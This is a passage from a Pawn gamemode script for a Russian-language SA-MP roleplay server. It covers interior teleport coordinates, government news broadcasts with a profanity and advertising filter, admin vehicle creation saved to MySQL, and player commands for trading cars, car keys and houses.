	case 9: { SetPlayerPos(playerid,315.856170,1024.496459,1949.797363); SetPlayerInterior(playerid,9); }
	case 10: { SetPlayerPos(playerid,286.148987,-40.644398,1001.569946); SetPlayerInterior(playerid,1); }
	case 11: { SetPlayerPos(playerid,286.800995,-82.547600,1001.539978); SetPlayerInterior(playerid,4); }
	case 12: { SetPlayerPos(playerid,296.919983,-108.071999,1001.569946); SetPlayerInterior(playerid,6); }
	case 13: { SetPlayerPos(playerid,314.820984,-141.431992,999.661987); SetPlayerInterior(playerid,7); }
	case 14: { SetPlayerPos(playerid,316.524994,-167.706985,999.661987); SetPlayerInterior(playerid,6); }
	case 15: { SetPlayerPos(playerid,302.292877,-143.139099,1004.062500); SetPlayerInterior(playerid,7); }
	case 16: { SetPlayerPos(playerid,235.508994,1189.169897,1080.339966); SetPlayerInterior(playerid,3); }
	case 17: { SetPlayerPos(playerid,225.756989,1240.000000,1082.149902); SetPlayerInterior(playerid,2); }
	case 18: { SetPlayerPos(playerid,223.043991,1289.259888,1082.199951); SetPlayerInterior(playerid,1); }
	case 19: { SetPlayerPos(playerid,225.630997,1022.479980,1084.069946); SetPlayerInterior(playerid,7); }
	case 20: { SetPlayerPos(playerid,295.138977,1474.469971,1080.519897); SetPlayerInterior(playerid,15); }
	case 21: { SetPlayerPos(playerid,328.493988,1480.589966,1084.449951); SetPlayerInterior(playerid,15); }
	case 22: { SetPlayerPos(playerid,385.803986,1471.769897,1080.209961); SetPlayerInterior(playerid,15); }
	case 23: { SetPlayerPos(playerid,375.971985,1417.269897,1081.409912); SetPlayerInterior(playerid,15); }
	case 24: { SetPlayerPos(playerid,490.810974,1401.489990,1080.339966); SetPlayerInterior(playerid,2); }
	case 25: { SetPlayerPos(playerid,447.734985,1400.439941,1084.339966); SetPlayerInterior(playerid,2); }
	case 26: { SetPlayerPos(playerid,227.722992,1114.389893,1081.189941); SetPlayerInterior(playerid,5); }
	case 27: { SetPlayerPos(playerid,260.983978,1286.549927,1080.299927); SetPlayerInterior(playerid,4); }
	case 28: { SetPlayerPos(playerid,221.666992,1143.389893,1082.679932); SetPlayerInterior(playerid,4); }
	case 29: { SetPlayerPos(playerid,27.132700,1341.149902,1084.449951); SetPlayerInterior(playerid,10); }
	case 30: { SetPlayerPos(playerid,-262.601990,1456.619995,1084.449951); SetPlayerInterior(playerid,4); }
	case 31: { SetPlayerPos(playerid,22.778299,1404.959961,1084.449951); SetPlayerInterior(playerid,5); }
	case 32: { SetPlayerPos(playerid,140.278000,1368.979980,1083.969971); SetPlayerInterior(playerid,5); }
	case 33: { SetPlayerPos(playerid,234.045990,1064.879883,1084.309937); SetPlayerInterior(playerid,6); }
	case 34: { SetPlayerPos(playerid,-68.294098,1353.469971,1080.279907); SetPlayerInterior(playerid,6); }
	case 35: { SetPlayerPos(playerid,-285.548981,1470.979980,1084.449951); SetPlayerInterior(playerid,15); }
	case 36: { SetPlayerPos(playerid,-42.581997,1408.109985,1084.449951); SetPlayerInterior(playerid,8); }
	case 37: { SetPlayerPos(playerid,83.345093,1324.439941,1083.889893); SetPlayerInterior(playerid,9); }
	case 38: { SetPlayerPos(playerid,260.941986,1238.509888,1084.259888); SetPlayerInterior(playerid,9); }
	case 39: { SetPlayerPos(playerid,1038.509888,-0.663752,1001.089966); SetPlayerInterior(playerid,3); }
	case 40: { SetPlayerPos(playerid,446.622986,509.318970,1001.419983); SetPlayerInterior(playerid,12); }
	case 41: { SetPlayerPos(playerid,2216.339844,-1150.509888,1025.799927); SetPlayerInterior(playerid,15); }
	case 42: { SetPlayerPos(playerid,833.818970,7.418000,1004.179993); SetPlayerInterior(playerid,3); }
	case 43: { SetPlayerPos(playerid,-100.325996,-22.816500,1000.741943); SetPlayerInterior(playerid,3); }
	case 44: { SetPlayerPos(playerid,964.376953,2157.329834,1011.019958); SetPlayerInterior(playerid,1); }
	case 45: { SetPlayerPos(playerid,-2239.569824,130.020996,1035.419922); SetPlayerInterior(playerid,6); }
	case 46: { SetPlayerPos(playerid,662.641601,-571.398803,16.343263); SetPlayerInterior(playerid,0); }
	case 47: { SetPlayerPos(playerid,614.581420,-23.066856,1004.781250); SetPlayerInterior(playerid,1); }
	case 48: { SetPlayerPos(playerid,612.508605,-129.236114,1001.992187); SetPlayerInterior(playerid,3); }
	case 49: { SetPlayerPos(playerid,-1786.603759,1215.553466,28.531250); SetPlayerInterior(playerid,0); }
	case 50: { SetPlayerPos(playerid,-2048.605957,162.093444,28.835937); SetPlayerInterior(playerid,1); }
	case 51: { SetPlayerPos(playerid,2170.284,1618.629,999.9766); SetPlayerInterior(playerid,1); }
	case 52: { SetPlayerPos(playerid,1889.975,1018.055,31.88281); SetPlayerInterior(playerid,10); }
	case 53: { SetPlayerPos(playerid,-2158.719971,641.287964,1052.369995); SetPlayerInterior(playerid,1); }
	case 54: { SetPlayerPos(playerid,1133.069946,-9.573059,1000.750000); SetPlayerInterior(playerid,12); }
	case 55: { SetPlayerPos(playerid,207.737991,-109.019997,1005.269958); SetPlayerInterior(playerid,15); }
	case 56: { SetPlayerPos(playerid,204.332993,-166.694992,1000.578979); SetPlayerInterior(playerid,14); }
	case 57: { SetPlayerPos(playerid,207.054993,-138.804993,1003.519958); SetPlayerInterior(playerid,3); }
	case 58: { SetPlayerPos(playerid,203.778000,-48.492397,1001.799988); SetPlayerInterior(playerid,1); }
	case 59: { SetPlayerPos(playerid,226.293991,-7.431530,1002.259949); SetPlayerInterior(playerid,5); }
	case 60: { SetPlayerPos(playerid,161.391006,-93.159156,1001.804687); SetPlayerInterior(playerid,18); }
	case 61: { SetPlayerPos(playerid,493.390991,-22.722799,1000.686951); SetPlayerInterior(playerid,17); }
	case 62: { SetPlayerPos(playerid,501.980988,-69.150200,998.834961); SetPlayerInterior(playerid,11); }
	case 63: { SetPlayerPos(playerid,-227.028000,1401.229980,27.769798); SetPlayerInterior(playerid,18); }
	case 64: { SetPlayerPos(playerid,460.099976,-88.428497,999.621948); SetPlayerInterior(playerid,4); }
	case 65: { SetPlayerPos(playerid,454.973950,-110.104996,999.717957); SetPlayerInterior(playerid,5); }
	case 66: { SetPlayerPos(playerid,452.489990,-18.179699,1001.179993); SetPlayerInterior(playerid,1); }
	case 67: { SetPlayerPos(playerid,681.474976,-451.150970,-25.616798); SetPlayerInterior(playerid,1); }
	case 68: { SetPlayerPos(playerid,366.923980,-72.929359,1001.507812); SetPlayerInterior(playerid,10); }
	case 69: { SetPlayerPos(playerid,365.672974,-10.713200,1001.869995); SetPlayerInterior(playerid,9); }
	case 70: { SetPlayerPos(playerid,372.351990,-131.650986,1001.449951); SetPlayerInterior(playerid,5); }
	case 71: { SetPlayerPos(playerid,377.098999,-192.439987,1000.643982); SetPlayerInterior(playerid,17); }
	case 72: { SetPlayerPos(playerid,244.411987,305.032990,999.231995); SetPlayerInterior(playerid,1); }
	case 73: { SetPlayerPos(playerid,271.884979,306.631989,999.325989); SetPlayerInterior(playerid,2); }
	case 74: { SetPlayerPos(playerid,291.282990,310.031982,999.154968); SetPlayerInterior(playerid,3); }
	case 75: { SetPlayerPos(playerid,302.181000,300.722992,999.231995); SetPlayerInterior(playerid,4); }
	case 76: { SetPlayerPos(playerid,322.197998,302.497986,999.231995); SetPlayerInterior(playerid,5); }
	case 77: { SetPlayerPos(playerid,346.870025,309.259033,999.155700); SetPlayerInterior(playerid,6); }
	case 78: { SetPlayerPos(playerid,-959.873962,1952.000000,9.044310); SetPlayerInterior(playerid,17); }
	case 79: { SetPlayerPos(playerid,388.871979,173.804993,1008.389954); SetPlayerInterior(playerid,3); }
	case 80: { SetPlayerPos(playerid,220.4109,1862.277,13.147); SetPlayerInterior(playerid,0); }
	case 81: { SetPlayerPos(playerid,772.112000,-3.898650,1000.687988); SetPlayerInterior(playerid,5); }
	case 82: { SetPlayerPos(playerid,774.213989,-48.924297,1000.687988); SetPlayerInterior(playerid,6); }
	case 83: { SetPlayerPos(playerid,773.579956,-77.096695,1000.687988); SetPlayerInterior(playerid,7); }
	case 84: { SetPlayerPos(playerid,1527.229980,-11.574499,1002.269958); SetPlayerInterior(playerid,3); }
	case 85: { SetPlayerPos(playerid,1523.509888,-47.821198,1002.269958); SetPlayerInterior(playerid,2); }
	case 86: { SetPlayerPos(playerid,2496.049805,-1693.929932,1014.750000); SetPlayerInterior(playerid,3); }
	case 87: { SetPlayerPos(playerid,1263.079956,-785.308960,1091.959961); SetPlayerInterior(playerid,5); }
	case 88: { SetPlayerPos(playerid,1291.725341,-788.319885,96.460937); SetPlayerInterior(playerid,0); }
	case 89: { SetPlayerPos(playerid,516.650,-18.611898,1001.459961); SetPlayerInterior(playerid,3); }
	case 90: { SetPlayerPos(playerid,2464.109863,-1698.659912,1013.509949); SetPlayerInterior(playerid,2); }
	case 91: { SetPlayerPos(playerid,2526.459961,-1679.089966,1015.500000); SetPlayerInterior(playerid,1); }
	case 92: { SetPlayerPos(playerid,2543.659912,-1303.629883,1025.069946); SetPlayerInterior(playerid,2); }
	case 93: { SetPlayerPos(playerid,1212.019897,-28.663099,1001.089966); SetPlayerInterior(playerid,3); }
	case 94: { SetPlayerPos(playerid,744.542969,1437.669922,1102.739990); SetPlayerInterior(playerid,6); }
	case 95: { SetPlayerPos(playerid,1204.809937,-11.586800,1001.089966); SetPlayerInterior(playerid,2); }
	case 96: { SetPlayerPos(playerid,1204.809937,13.586800,1001.089966); SetPlayerInterior(playerid,2); }
	case 97: { SetPlayerPos(playerid,940.921997,-17.007000,1001.179993); SetPlayerInterior(playerid,3); }
	case 98: { SetPlayerPos(playerid,964.106995,-53.205498,1001.179993); SetPlayerInterior(playerid,3); }
	case 99: { SetPlayerPos(playerid,-2661.009766,1415.739990,923.305969); SetPlayerInterior(playerid,3); }
	case 100: { SetPlayerPos(playerid,-2637.449951,1404.629883,906.457947); SetPlayerInterior(playerid,3); }
	case 101: { SetPlayerPos(playerid,-735.5619504,484.351318,1371.952270); SetPlayerInterior(playerid,1); }
	case 102: { SetPlayerPos(playerid,-794.8064,491.6866,1376.195); SetPlayerInterior(playerid,1); }
	case 103: { SetPlayerPos(playerid,-835.2504,500.9161,1358.305); SetPlayerInterior(playerid,1); }
	case 104: { SetPlayerPos(playerid,-813.431518,533.231079,1390.782958); SetPlayerInterior(playerid,1); }
	case 105: { SetPlayerPos(playerid,2350.339844,-1181.649902,1028.000000); SetPlayerInterior(playerid,5); }
	case 106: { SetPlayerPos(playerid,2807.619873,-1171.899902,1025.579956); SetPlayerInterior(playerid,8); }
	case 107: { SetPlayerPos(playerid,318.564972,1118.209961,1083.979980); SetPlayerInterior(playerid,5); }
	case 108: { SetPlayerPos(playerid,1412.639893,-1.787510,1000.931946); SetPlayerInterior(playerid,1); }
	case 109: { SetPlayerPos(playerid,1302.519897,-1.787510,1000.931946); SetPlayerInterior(playerid,18); }
	case 110: { SetPlayerPos(playerid,2522.0,-1673.383911,14.8); SetPlayerInterior(playerid,0); }
	case 111: { SetPlayerPos(playerid,-219.322601,1410.444824,27.773437); SetPlayerInterior(playerid,18); }
	case 112: { SetPlayerPos(playerid,2324.419922,-1147.539917,1050.719971); SetPlayerInterior(playerid,12); }
	case 113: { SetPlayerPos(playerid,-972.4957,1060.983,1358.914); SetPlayerInterior(playerid,10); }
	case 114: { SetPlayerPos(playerid,411.625977,-21.433298,1001.799988); SetPlayerInterior(playerid,2); }
	case 115: { SetPlayerPos(playerid,418.652985,-82.639793,1001.959961); SetPlayerInterior(playerid,3); }
	case 116: { SetPlayerPos(playerid,412.021973,-52.649899,1001.959961); SetPlayerInterior(playerid,12); }
	case 117: { SetPlayerPos(playerid,-204.439987,-26.453999,1002.299988); SetPlayerInterior(playerid,16); }
	case 118: { SetPlayerPos(playerid,-204.439987,-8.469600,1002.299988); SetPlayerInterior(playerid,17); }
	case 119: { SetPlayerPos(playerid,-204.439987,-43.652496,1002.299988); SetPlayerInterior(playerid,3); }
	case 120: { SetPlayerPos(playerid,246.783997,63.900200,1003.639954); SetPlayerInterior(playerid,6); }
	case 121: { SetPlayerPos(playerid,246.375992,109.245995,1003.279968); SetPlayerInterior(playerid,10); }
	case 122: { SetPlayerPos(playerid,288.745972,169.350998,1007.179993); SetPlayerInterior(playerid,3); }
	case 123: { SetPlayerPos(playerid,1494.429932,1305.629883,1093.289917); SetPlayerInterior(playerid,3); }
	case 124: { SetPlayerPos(playerid,-2029.719971,-115.067993,1035.169922); SetPlayerInterior(playerid,3); }
	case 125: { SetPlayerPos(playerid,420.484985,2535.589844,10.020289); SetPlayerInterior(playerid,10); }
	case 126: { SetPlayerPos(playerid,-2184.751464,2413.111816,5.156250); SetPlayerInterior(playerid,0); }
	case 127: { SetPlayerPos(playerid,-1397.782470,-203.723114,1051.346801); SetPlayerInterior(playerid,7); }
	case 128: { SetPlayerPos(playerid,-1398.103515,933.445434,1041.531250); SetPlayerInterior(playerid,15); }
	case 129: { SetPlayerPos(playerid,-1428.809448,-663.595886,1060.219848); SetPlayerInterior(playerid,4); }
	case 130: { SetPlayerPos(playerid,-1486.861816,1642.145996,1060.671875); SetPlayerInterior(playerid,14); }
	case 131: { SetPlayerPos(playerid,-1401.830000,107.051300,1032.273000); SetPlayerInterior(playerid,1); }
	case 132: { SetPlayerPos(playerid,1382.615600,2184.345703,11.023437); SetPlayerInterior(playerid,0); }
	case 133: { SetPlayerPos(playerid,297.9414,-64.3876,1001.5156); SetPlayerInterior(playerid,4); }
	case 134: { SetPlayerPos(playerid,302.1602,-164.7588,999.6105); SetPlayerInterior(playerid,6); } }
	return true;
}

stock SendGov(playerid,text[])
{
	SendClientMessageToAll(CWHITE,"|__________[Государственные новости]__________|");
	new str[200];
	switch(PlayerInfo[playerid][pMember])
	{
		case F_LVPD,F_FBI,F_LSPD: format(str, sizeof(str), "{736dfc}%s | %s %s[%d]:{FFFFFF} %s",FracInfo[PlayerInfo[playerid][pMember]][fName],FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],playerid,text);
		case F_HOSPITAL_LS,F_MAYOR,F_LIC: format(str, sizeof(str), "{20BA09}%s | %s %s[%d]:{FFFFFF} %s",FracInfo[PlayerInfo[playerid][pMember]][fName],FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],playerid,text);
		case F_ARMY: format(str, sizeof(str), "{ffc600}%s | %s %s[%d]:{FFFFFF} %s",FracInfo[PlayerInfo[playerid][pMember]][fName],FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],playerid,text);
	}
	SendClientMessageToAll(CWHITE,str);
	
	strmid(GovInfo[TOTALGOV][gText], str, 0, strlen(str), 80);
	GovInfo[TOTALGOV][gMember] = PlayerInfo[playerid][pMember];
	GovInfo[TOTALGOV][gTime] = gettime();
	if(TOTALGOV > 11) TOTALGOV = 0;
	else TOTALGOV++;
	return 1;
}
CMD:news(playerid, params[])
{
	static const fmt_string1[] = "{ffffff}[%02d/%02d/%d %02d:%02d:%02d]\t\t%s\n";
	new str1[sizeof(fmt_string1)+80];
	query = "";
	new year, month, day, hour, minute, second;
	for(new i = 0; i < 12; i++)
	{
	    if(!GovInfo[i][gTime]) continue;
	    if(i && GovInfo[i-1][gMember] != GovInfo[i][gMember]) strcat(query,"\n");
	    TimestampToDate(GovInfo[i][gTime], year, month, day, hour, minute, second,0);
		format(str1, sizeof(str1), fmt_string1,day,month,year,hour,minute,second,GovInfo[i][gText]);
		strcat(query,str1);
	}
	ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Последние гос. новости",query,"Далее","");
	return 1;
}
CMD:gov(playerid, params[])
{
	if(!IsAMafia(playerid) && !IsAGang(playerid) && PlayerInfo[playerid][pMember] != F_NEWS)
	{
		if(PlayerInfo[playerid][pLeader] > 0)
		{
			new text[80];
			if(sscanf(params, "s[80]", text)) return SendClientMessage(playerid, CGREY, "Используйте: /gov [текст]");
			if(GetPVarInt(playerid,"TimeGov") > gettime()) return SendClientMessage(playerid, CGREY, "Писать можно только три сообщения!");
			if(strfind(params[0],"хуй",true) != -1 || strfind(params[0],"жопа",true) != -1 || strfind(params[0],"пизда",true) != -1 || strfind(params[0],"подписывайся",true) != -1 || strfind(params[0],":7777",true) != -1)
			{
			    static const fmt_string1[] = "[A] Warning: %s[%d] (/gov): %s";
				new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+4+64];
				format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],playerid,params[0]);
				SendAdminMessage(CLIGHTRED,str1);
				return true;
			}
			if(GetPVarInt(playerid,"TimeGovCheck") < 2) SetPVarInt(playerid,"TimeGovCheck",GetPVarInt(playerid,"TimeGovCheck")+1);
			else
			{
			    DeletePVar(playerid,"TimeGovCheck");
			    SetPVarInt(playerid,"TimeGov",gettime()+60*2);
			}
            if(strlen(text) >= 40)
			{
				new string1[128];
				strmid(string1,text,41,128,128);
				strdel(text,41,128);
    			SendGov(playerid,text);
				SendGov(playerid,string1);
			}
			else SendGov(playerid,text);
		}
	}
	return true;
}
CMD:vpc(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	if(GetPVarInt(playerid, "AddVehicleFrac") == 0) return true;
	if(GetPlayerState(playerid) != 2) return true;
	if(!IsPlayerInVehicle(playerid, GetPVarInt(playerid, "AddVehicleFrac"))) return true;
	new Float:X,Float:Y,Float:Z,Float:FA;
	GetVehicleZAngle(GetPlayerVehicleID(playerid), FA);
	GetVehiclePos(GetPlayerVehicleID(playerid), X,Y,Z);
	DestroyVehicle(GetPVarInt(playerid, "AddVehicleFrac"));
	TOTALVEH++;
	sscanf(coordv, "p<,>iiiiii", VehInfo[TOTALVEH][vModel], VehInfo[TOTALVEH][vColor][0],
	VehInfo[TOTALVEH][vColor][1],VehInfo[TOTALVEH][vFr],VehInfo[TOTALVEH][vInt],VehInfo[TOTALVEH][vWorld]);
	format(VehInfo[TOTALVEH][vColors], 16, "%i, %i", VehInfo[TOTALVEH][vColor][0],VehInfo[TOTALVEH][vColor][1]);
	VehInfo[TOTALVEH][vX] = X;
	VehInfo[TOTALVEH][vY] = Y;
	VehInfo[TOTALVEH][vZ] = Z;
	VehInfo[TOTALVEH][vFa] = FA;
	VehInfo[TOTALVEH][vVehicle] = CreateVehicle(VehInfo[TOTALVEH][vModel], VehInfo[TOTALVEH][vX], VehInfo[TOTALVEH][vY], VehInfo[TOTALVEH][vZ], VehInfo[TOTALVEH][vFa],VehInfo[TOTALVEH][vColor][0],VehInfo[TOTALVEH][vColor][1], 300);
	LinkVehicleToInterior(VehInfo[TOTALVEH][vVehicle], VehInfo[TOTALVEH][vInt]);
	SetVehicleVirtualWorld(VehInfo[TOTALVEH][vVehicle], VehInfo[TOTALVEH][vWorld]);
	Fuel[VehInfo[TOTALVEH][vVehicle]] = 100;
	SetEngine(playerid,GetPlayerVehicleID(playerid),true);
	Engine[VehInfo[TOTALVEH][vVehicle]] = false;
	Lights[VehInfo[TOTALVEH][vVehicle]] = false;
	DeletePVar(playerid, "AddVehicleFrac");
	query = "";
	format(query,sizeof(query),"INSERT INTO "TABLE_VEH" (id, model, x, y, z, fa, vint, world, colors, fraction) VALUES (%i, %i, '%f', '%f', '%f', '%f', %i, %i, '%s', %i)",
	TOTALVEH,VehInfo[TOTALVEH][vModel],VehInfo[TOTALVEH][vX],VehInfo[TOTALVEH][vY],VehInfo[TOTALVEH][vZ],VehInfo[TOTALVEH][vFa],VehInfo[TOTALVEH][vInt],
	VehInfo[TOTALVEH][vWorld],VehInfo[TOTALVEH][vColors],VehInfo[TOTALVEH][vFr]);
	mysql_tquery(mysql,query);
	SendClientMessage(playerid, COLOR_ORANGE, "Транспорт создан");
	return true;
}
CMD:changecar(playerid,params[])
{
   	if(PlayerLogged[playerid] == false) return true;
   	if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid,CGREY,"Вы не в машине");
   	new kek = 0;
	for(new v = 1; v <= TOTALV; v++)
	{
	    if(VInfo[v][vcar] == INVALID_VEHICLE_ID) continue;
		if(GetPlayerVehicleID(playerid) == VInfo[v][vcar])
		{
  			if(strcmp(VInfo[v][vname], PlayerInfo[playerid][pSendername], true) == 0) kek = v;
		}
	}
	if(VInfo[kek][vfam]) return SendClientMessage(playerid,CGREY,"Нельзя обменять транспорт семьи!");
	if( VInfo[kek][vobj1] > 0  || PlayerInfo[playerid][pShtrav] > 0) return SendClientMessage(playerid,CGREY,"У Вас имеются неоплаченые штрафы или игрок работает таксистом");
	if(kek == 0) return SendClientMessage(playerid,CGREY,"Это не ваше транспортное средство");
	if(sscanf(params, "ui", params[0],params[1])) return SendClientMessage(playerid, CGREY, "Используйте: /changecar [id] [цена]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
    new Float:x,Float:y,Float:z;
    GetPlayerPos(params[0],x,y,z);
    if(!IsPlayerInRangeOfPoint(playerid, 15.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
   	new kek1 = 0;
	for(new v = 1; v <= TOTALV; v++)
	{
	    if(VInfo[v][vcar] == INVALID_VEHICLE_ID) continue;
		if(GetPlayerVehicleID(params[0]) == VInfo[v][vcar])
		{
  			if(strcmp(VInfo[v][vname], PlayerInfo[params[0]][pSendername], true) == 0) kek1 = v;
		}
	}
	if( VInfo[kek1][vobj1] > 0 || PlayerInfo[params[0]][pShtrav] > 0) return SendClientMessage(params[0],CGREY,"У Вас имеются неоплаченые штрафы или вы работаете таксистом!");
	if(kek1 == 0) return SendClientMessage(playerid,CGREY,"Это не транспортное средство игрока");
    if(params[1] < 1 || params[1] > 10000000) return SendClientMessage(playerid,CGREY,"Вы не можете обменять машину с доплатой меньше чем за $1");
	static const fmt_string2[] = "{FFFFFF}Вы действительно хотите продать свой транспорт игроку?\nВы получите:{f7ae11}\n$%i\n%s{FFFFFF}\nОтдадите:\n{f7ae11}%s";
	new str2[sizeof(fmt_string2)+32+10];
	format(str2, sizeof(str2), fmt_string2,params[1],VehicleNameS[GetVehicleModel(GetPlayerVehicleID(params[0]))-400],VehicleNameS[GetVehicleModel(GetPlayerVehicleID(playerid))-400]);
	ShowPlayerDialog(playerid,88,DIALOG_STYLE_MSGBOX,"Обмен транспорта",str2,"Да","Нет");
	SetPVarInt(playerid,"ObmID",params[0]);
	SetPVarInt(playerid,"ObmCar",kek1);
	SetPVarInt(playerid,"ObmCar1",GetPlayerVehicleID(params[0]));
	SetPVarInt(playerid,"ObmCena",params[1]);
	return true;
}
CMD:takecarkey(playerid,params[])
{
   	if(PlayerLogged[playerid] == false) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /takecarkey [id]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false || params[0] == playerid) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
    new Float:x,Float:y,Float:z;
    GetPlayerPos(params[0],x,y,z);
    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
   	new kek = 0;
	for(new v = 1; v <= TOTALV; v++)
	{
	    if(VInfo[v][vcar] == INVALID_VEHICLE_ID) continue;
		if(PlayerInfo[params[0]][pKeys] == VInfo[v][vcar])
		{
  			if(strcmp(VInfo[v][vname], PlayerInfo[playerid][pSendername], true) == 0) kek = v;
		}
	}
	if(kek == 0) return SendClientMessage(playerid,CGREY,"У данного игрока нет ключей от Вашего транспорта");
    //if(PlayerInfo[params[0]][pLevel] < 2) return SendClientMessage(playerid, CGREY, "Покупка со 2 уровня");
    PlayerInfo[params[0]][pKeys] = 0;
	static const fmt_string2[] = "%s забрал у Вас ключи от %s";
	new str2[sizeof(fmt_string2)+32+10];
	format(str2, sizeof(str2), fmt_string2,PlayerInfo[playerid][pSendername],VehicleNameS[VInfo[kek][vmodel]-400]);
	SendClientMessage(params[0], CREWARD, str2);
	static const fmt_stri3ng2[] = "Вы забрали у %s ключи от %s";
	new str3[sizeof(fmt_stri3ng2)+32+10];
	format(str3, sizeof(str3), fmt_stri3ng2,PlayerInfo[params[0]][pSendername],VehicleNameS[VInfo[kek][vmodel]-400]);
	SendClientMessage(playerid, CREWARD, str3);
	return true;
}
CMD:givecarkey(playerid,params[])
{
   	if(PlayerLogged[playerid] == false) return true;
   	if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid,CGREY,"Вы не в машине");
   	new kek = 0;
	for(new v = 1; v <= TOTALV; v++)
	{
	    if(VInfo[v][vcar] == INVALID_VEHICLE_ID) continue;
		if(GetPlayerVehicleID(playerid) == VInfo[v][vcar])
		{
  			if(strcmp(VInfo[v][vname], PlayerInfo[playerid][pSendername], true) == 0) kek = v;
		}
	}
	if(kek == 0) return SendClientMessage(playerid,CGREY,"Это не ваше транспортное средство");
	if(sscanf(params, "u", params[0],params[1])) return SendClientMessage(playerid, CGREY, "Используйте: /givecarkey [id]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false || params[0] == playerid) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
    new Float:x,Float:y,Float:z;
    GetPlayerPos(params[0],x,y,z);
    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
    //if(PlayerInfo[params[0]][pLevel] < 2) return SendClientMessage(playerid, CGREY, "Покупка со 2 уровня");
    PlayerInfo[params[0]][pKeys] = GetPlayerVehicleID(playerid);
	static const fmt_string2[] = "%s выдал Вам ключи от %s";
	new str2[sizeof(fmt_string2)+32+10];
	format(str2, sizeof(str2), fmt_string2,PlayerInfo[playerid][pSendername],VehicleNameS[GetVehicleModel(GetPlayerVehicleID(playerid))-400]);
	SendClientMessage(params[0], CREWARD, str2);
	static const fmt_stri3ng2[] = "Вы выдали %s ключи от %s";
	new str3[sizeof(fmt_stri3ng2)+32+10];
	format(str3, sizeof(str3), fmt_stri3ng2,PlayerInfo[params[0]][pSendername],VehicleNameS[GetVehicleModel(GetPlayerVehicleID(playerid))-400]);
	SendClientMessage(playerid, CREWARD, str3);
	return true;
}
CMD:sellcar(playerid,params[])
{
   	if(PlayerLogged[playerid] == false) return true;
   	if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid,CGREY,"Вы не в машине");
   	new kek = 0;
	for(new v = 1; v <= TOTALV; v++)
	{
	    if(VInfo[v][vcar] == INVALID_VEHICLE_ID) continue;
		if(GetPlayerVehicleID(playerid) == VInfo[v][vcar])
		{
  			if(strcmp(VInfo[v][vname], PlayerInfo[playerid][pSendername], true) == 0) kek = v;
		}
	}
	if(VInfo[kek][vfam]) return SendClientMessage(playerid,CGREY,"Нельзя продать транспорт семьи!");
	if( VInfo[kek][vobj1] > 0 || PlayerInfo[playerid][pShtrav] > 0) return SendClientMessage(playerid,CGREY,"У Вас имеются неоплаченые штрафы или вы работаете таксистом");
	if(kek == 0) return SendClientMessage(playerid,CGREY,"Это не ваше транспортное средство");
	if(sscanf(params, "ui", params[0],params[1])) return SendClientMessage(playerid, CGREY, "Используйте: /sellcar [id] [цена]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false || params[0] == playerid) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
    new Float:x,Float:y,Float:z;
    GetPlayerPos(params[0],x,y,z);
    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
    //if(PlayerInfo[params[0]][pLevel] < 2) return SendClientMessage(playerid, CGREY, "Покупка со 2 уровня");
    if(params[1] < 1 || params[1] > 10000000) return SendClientMessage(playerid,CGREY,"Вы не можете продать машину меньше чем за $1");
	static const fmt_string2[] = "{FFFFFF}Вы действительно хотите продать свой транспорт игроку?\nВы получите:{f7ae11}\n$%i{FFFFFF}\nОтдадите:\n{f7ae11}%s";
	new str2[sizeof(fmt_string2)+32+10];
	format(str2, sizeof(str2), fmt_string2,params[1],VehicleNameS[GetVehicleModel(GetPlayerVehicleID(playerid))-400]);
	ShowPlayerDialog(playerid,86,DIALOG_STYLE_MSGBOX,"Продажа транспорта",str2,"Да","Нет");
	SetPVarInt(playerid,"PradID1",params[0]);
	SetPVarInt(playerid,"PradCena1",params[1]);
	return true;
}
CMD:sellhouse(playerid,params[])
{
   	if(PlayerLogged[playerid] == false) return true;
   	if(GetPlayerHouse(playerid))
   	{
   	    if(sscanf(params, "ui", params[0],params[1])) return SendClientMessage(playerid, CGREY, "Используйте: /sellhouse [id] [цена]");
	    new Float:x,Float:y,Float:z;
	    GetPlayerPos(params[0],x,y,z);
	    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
	    //if(PlayerInfo[params[0]][pLevel] < 2) return SendClientMessage(playerid, CGREY, "Покупка со 2 уровня");
	    if(params[1] < 1 || params[1] > 10000000) return SendClientMessage(playerid,CGREY,"Вы не можете продать дом меньше чем за $1");
		if(GetPlayerHouse(params[0])) return SendClientMessage(playerid,CGREY,"У Игрока есть дом");
		static const fmt_string2[] = "{FFFFFF}Вы действительно хотите продать свой дом?\nВы получите:{f7ae11}\n$%i{FFFFFF}\nОтдадите:\n{f7ae11}Дом №%i(%s класса)";
		new str2[sizeof(fmt_string2)+32+10];
		format(str2, sizeof(str2), fmt_string2,params[1],GetPVarInt(playerid,"PlayerHouse"),HInfo[GetPVarInt(playerid,"PlayerHouse")][hClass]);
